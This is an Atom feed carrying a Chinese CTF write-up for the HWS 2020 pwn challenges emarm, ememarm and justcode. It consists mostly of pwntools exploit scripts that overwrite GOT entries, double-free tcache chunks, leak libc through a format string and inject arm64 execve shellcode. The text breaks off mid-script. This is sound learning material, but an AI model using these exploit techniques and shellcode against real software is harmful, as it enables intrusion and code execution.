<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>(*╹▽╹*)</title>
  
  
  <link href="https://brooke-hub.github.io/atom.xml" rel="self"/>
  
  <link href="https://brooke-hub.github.io/"/>
  <updated>2021-06-05T04:02:01.492Z</updated>
  <id>https://brooke-hub.github.io/</id>
  
  <author>
    <name>WendyJellyBeans</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hws2020</title>
    <link href="https://brooke-hub.github.io/2021/06/05/hws2020/"/>
    <id>https://brooke-hub.github.io/2021/06/05/hws2020/</id>
    <published>2021-06-05T03:58:59.000Z</published>
    <updated>2021-06-05T04:02:01.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hws冬令营选拔赛复现"><a href="#hws冬令营选拔赛复现" class="headerlink" title="hws冬令营选拔赛复现"></a>hws冬令营选拔赛复现</h1><p>拖延半年</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="emarm"><a href="#emarm" class="headerlink" title="emarm"></a>emarm</h4><h5 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h5><p>一次任意地址写，先把fread@got改写为main中一个从<code>read(0, v15, 8uLL);</code>开始的地址，实现多次任意写</p><p>向data段写sc，再改写fread@got为data地址，执行到<code>fread(v12, size, 1uLL, stream);</code>触发</p><p><img src="/2021/06/05/hws2020/image-20210422104524430.png" alt="image-20210422104524430"></p><p><a href="https://www.exploit-db.com/shellcodes/47048">arm64 shellcode</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sc1 = <span class="string">&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2&quot;</span></span><br><span class="line">sc2 = <span class="string">&quot;\xe1\x65\xce\xf2\x01\x0d\xe0\xf2&quot;</span></span><br><span class="line">sc3 = <span class="string">&quot;\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa&quot;</span></span><br><span class="line">sc4 = <span class="string">&quot;\xe2\x03\x1f\xaa\xe0\x63\x21\x8b&quot;</span></span><br><span class="line">sc5 = <span class="string">&quot;\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span>(<span class="params">addr,content</span>):</span></span><br><span class="line">    sd(<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&#x27;success&#x27;</span>,content)</span><br><span class="line">    sla(<span class="string">&#x27;bye&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;passwd:&#x27;</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fread_got = <span class="number">0x412060</span></span><br><span class="line">    main_read = <span class="number">0x0000000000400BE4</span></span><br><span class="line">    write_to(fread_got,p64(main_read))</span><br><span class="line"></span><br><span class="line">    write_to(<span class="number">0x0000000000412080</span>, sc1)</span><br><span class="line">    write_to(<span class="number">0x0000000000412088</span>, sc2)</span><br><span class="line">    write_to(<span class="number">0x0000000000412090</span>, sc3)</span><br><span class="line">    write_to(<span class="number">0x0000000000412098</span>, sc4)</span><br><span class="line">    write_to(<span class="number">0x00000000004120a0</span>, sc5)</span><br><span class="line"></span><br><span class="line">    write_to(fread_got,p64(<span class="number">0x0000000000412080</span>))</span><br><span class="line">    ti()</span><br><span class="line">pwn()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="泄露基地址，改got表为og"><a href="#泄露基地址，改got表为og" class="headerlink" title="泄露基地址，改got表为og"></a>泄露基地址，改got表为og</h5><p><a href="https://blog.csdn.net/qq_39869547/article/details/105255683">qemu arm 调试</a></p><p>进入gdb先劫持到加载器，程序还没被加载</p><p>no pie 所以直接下断点等待捕获就行了</p><p>改写atoi@got为printf@plt，num写入fmt，之后 <code>size = atoi(num);</code>泄漏栈内容</p><p><img src="/2021/06/05/hws2020/image-20210422121323728.png" alt="image-20210422121323728"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;-g&quot;,&quot;1241&quot;,&quot;./emarm&quot;])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendlineafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.sendline(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.send(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">n</span>):</span> <span class="keyword">return</span> sh.recv(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.recvuntil(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ti</span>():</span> <span class="keyword">return</span> sh.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">name, addr</span>):</span> <span class="keyword">return</span> log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span>(<span class="params">addr, content</span>):</span></span><br><span class="line">    sd(<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&#x27;success&#x27;</span>, content)</span><br><span class="line">    <span class="comment"># sla(&#x27;bye&#x27;, &#x27;1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;passwd:&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    atoi_got = <span class="number">0x412020</span></span><br><span class="line">    printf_plt = <span class="number">0x00000000004008B0</span></span><br><span class="line">    write_to(atoi_got,p64(printf_plt))</span><br><span class="line">    sla(<span class="string">&#x27;bye&#x27;</span>,<span class="string">&#x27;%9$p&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    base = <span class="built_in">int</span>(sh.recv(<span class="number">10</span>),<span class="number">16</span>) - <span class="number">0x206e0</span></span><br><span class="line">    leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">    ti()</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br></pre></td></tr></table></figure><p><img src="/2021/06/05/hws2020/image-20210422121554233.png" alt="image-20210422121554233"></p><p>先本地调试找好fmt偏移 9</p><p>得到本机基地址0x400084a000</p><p><img src="/2021/06/05/hws2020/image-20210422190207581.png" alt="image-20210422190207581"></p><p><img src="/2021/06/05/hws2020/image-20210422191204668.png" alt="image-20210422191204668"></p><p>但是这个本地没打通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># import sys</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binary=&#x27;./emarm&#x27;</span></span><br><span class="line"><span class="comment"># elf=ELF(binary)</span></span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;-g&quot;,&quot;1241&quot;,&quot;./emarm&quot;])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendlineafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.sendline(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.send(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">n</span>):</span> <span class="keyword">return</span> sh.recv(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.recvuntil(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ti</span>():</span> <span class="keyword">return</span> sh.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">name, addr</span>):</span> <span class="keyword">return</span> log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span>(<span class="params">addr, content</span>):</span></span><br><span class="line">    sd(<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&#x27;success&#x27;</span>, content)</span><br><span class="line">    sla(<span class="string">&#x27;bye&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;passwd:&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fread_got = <span class="number">0x412060</span></span><br><span class="line">    libc_base = <span class="number">0x400084a000</span></span><br><span class="line">    og = [<span class="number">0x3f150</span>, <span class="number">0x3f174</span>, <span class="number">0x3f198</span>, <span class="number">0x63e80</span>]</span><br><span class="line">    write_to(fread_got, p64(og[<span class="number">3</span>]+libc_base))</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br></pre></td></tr></table></figure><h4 id="ememarm"><a href="#ememarm" class="headerlink" title="ememarm"></a>ememarm</h4><p><img src="/2021/06/05/hws2020/image-20210422212601991.png" alt="image-20210422212601991"></p><p>!(C:\Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422203702651.png)</p><p><img src="/2021/06/05/hws2020/image-20210422203848683.png" alt="image-20210422203848683"></p><p>攻击chunk5[3]和chunk4[3]，edit之后会free chunk[3]指向的chunk，所以fake chunk被double free了</p><p><img src="/2021/06/05/hws2020/image-20210422213354259.png" alt="image-20210422213354259"></p><p>看不到bin好麻烦</p><p>tcachebin[0x30]-&gt;fakechunk-&gt;fakechunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./ememarm&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">cx,cy,num</span>):</span> <span class="comment">#size 0x30</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">&#x27;cx:&#x27;</span>,cx)</span><br><span class="line">    sa(<span class="string">&#x27;cy&#x27;</span>,cy)</span><br><span class="line">    sla(<span class="string">&#x27;delete?&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">num,content</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(num))</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">cx, cy, num</span>):</span> <span class="comment"># size 0x40</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sa(<span class="string">&#x27;cx:&#x27;</span>, cx)</span><br><span class="line">    sa(<span class="string">&#x27;cy&#x27;</span>, cy)</span><br><span class="line">    sla(<span class="string">&#x27;delete?&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;note  ~~&#x27;</span>)</span><br><span class="line">    bss = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    leak(<span class="string">&#x27;bss&#x27;</span>,bss)</span><br><span class="line"></span><br><span class="line">    sl(<span class="string">&#x27;WENDY&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    add(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;\x31&#x27;</span>, <span class="number">1</span>)<span class="comment">#3 fake size</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#5</span></span><br><span class="line">    gift(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>)<span class="comment">#6</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30]-&gt;fakechunk-&gt;fakechunk</span></span><br><span class="line"></span><br><span class="line">    add(p64(bss+<span class="number">0x10</span>),p64(<span class="number">0</span>),<span class="number">0</span>) <span class="comment"># fakechunk</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30] -&gt; fakechunk -&gt; bss+0x10</span></span><br><span class="line">    add(p64(<span class="number">0</span>),p64(bss+<span class="number">0x20</span>),<span class="number">0</span>) <span class="comment">#fakechunk chunk3[3]-&gt;bss+0x20</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30]  -&gt; bss+0x10</span></span><br><span class="line"></span><br><span class="line">    sc1 = <span class="string">&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2&quot;</span></span><br><span class="line">    sc2 = <span class="string">&quot;\xe1\x65\xce\xf2\x01\x0d\xe0\xf2&quot;</span></span><br><span class="line">    sc3 = <span class="string">&quot;\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa&quot;</span></span><br><span class="line">    sc3+= <span class="string">&quot;\xe2\x03\x1f\xaa\xe0\x63\x21\x8b&quot;</span></span><br><span class="line">    sc3+= <span class="string">&quot;\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line"></span><br><span class="line">    add(sc1,sc2,<span class="number">0</span>) <span class="comment"># bss+0x10</span></span><br><span class="line">    edit(<span class="number">4</span>,sc3) <span class="comment"># find chunk4 by chunk3[3] // so chunk4 == bss+0x20</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># free --&gt; now chunk1-&gt;next=null</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>) <span class="comment"># chunk_list1-&gt;next =this --&gt;index2</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>)<span class="comment">#5</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    edit(<span class="number">5</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># tcachebin[0x40]-&gt;fakechunk-&gt;fakechunk</span></span><br><span class="line"></span><br><span class="line">    gift(p64(elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]), p64(<span class="number">0</span>), <span class="number">0</span>)  <span class="comment"># fakechunk</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30] -&gt; fakechunk -&gt; __isoc99_scanf@got</span></span><br><span class="line">    gift(p64(<span class="number">0</span>), p64(<span class="number">0</span>), <span class="number">0</span>)  <span class="comment"># fakechunk chunk3[3]-&gt;0</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30]  -&gt; __isoc99_scanf@got</span></span><br><span class="line">    gift(p64(bss+<span class="number">0x10</span>), p64(bss+<span class="number">0x10</span>), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    ti()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;./ememarm&#x27;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&#x27;qemu-aarch64&#x27;, &#x27;-L&#x27;, &#x27;./&#x27;, &#x27;-g&#x27;, &#x27;1247&#x27;, &#x27;./ememarm&#x27;])</span></span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一晚上算是搞懂了，下班！</p><p><img src="/2021/06/05/hws2020/image-20210422221203902.png" alt="image-20210422221203902"></p><h5 id="justcode"><a href="#justcode" class="headerlink" title="justcode"></a>justcode</h5><p>case2中</p><p>scanf(“%d”,v1)</p><p>没有&amp;，会把栈地址上的内容作为地址，让我们写入</p><p>case1与case2被main调用，两个函数的栈是复用的，可以通过case1控制case2中v1的值，</p><p>一次任意地址写，</p><p>case1还可以溢出到canary触发stack check fail</p><p>因此可以改写__stack_chk_fail@got</p><p>这里改为ret(pop rip)，然后进入case2构造好栈内容（csu_rop）并溢出触发，控制执行流</p><p>选择改__stack_chk_fail@got是因为它还未被调用，真实地址没被写入，所以%d（4个字节）就可以完全覆盖</p><p>可以把flag字符串，和指向open地址的指针，写入到bss</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 